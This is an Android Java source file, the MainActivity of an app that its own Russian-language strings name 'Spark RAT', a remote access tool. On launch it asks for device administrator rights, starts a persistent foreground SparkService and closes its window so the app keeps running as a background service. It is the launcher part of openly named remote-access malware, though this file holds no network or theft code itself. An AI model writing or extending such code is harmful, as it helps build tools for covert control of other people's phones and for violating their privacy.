package com.spark.android;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private static final int ADMIN_REQUEST_CODE = 1001;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Log.d(TAG, "MainActivity created");
        
        // Проверяем и запрашиваем админ-права если нужно
        requestAdminRights();
        
        // Запускаем основной сервис
        startSparkService();
        
        // Закрываем активность (приложение работает как сервис)
        finish();
    }
    
    private void requestAdminRights() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, SparkAdminReceiver.class);
            
            if (!dpm.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                    "Для работы Spark RAT необходимы права администратора устройства");
                startActivityForResult(intent, ADMIN_REQUEST_CODE);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error requesting admin rights", e);
        }
    }
    
    private void startSparkService() {
        try {
            Intent serviceIntent = new Intent(this, SparkService.class);
            
            // Для Android 8.0+ нужно использовать foreground service
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            Toast.makeText(this, "Spark RAT запущен", Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting Spark service", e);
            Toast.makeText(this, "Ошибка запуска сервиса", Toast.LENGTH_SHORT).show();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == ADMIN_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                Toast.makeText(this, "Админ-права получены", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Админ-права не получены", Toast.LENGTH_SHORT).show();
            }
        }
    }
}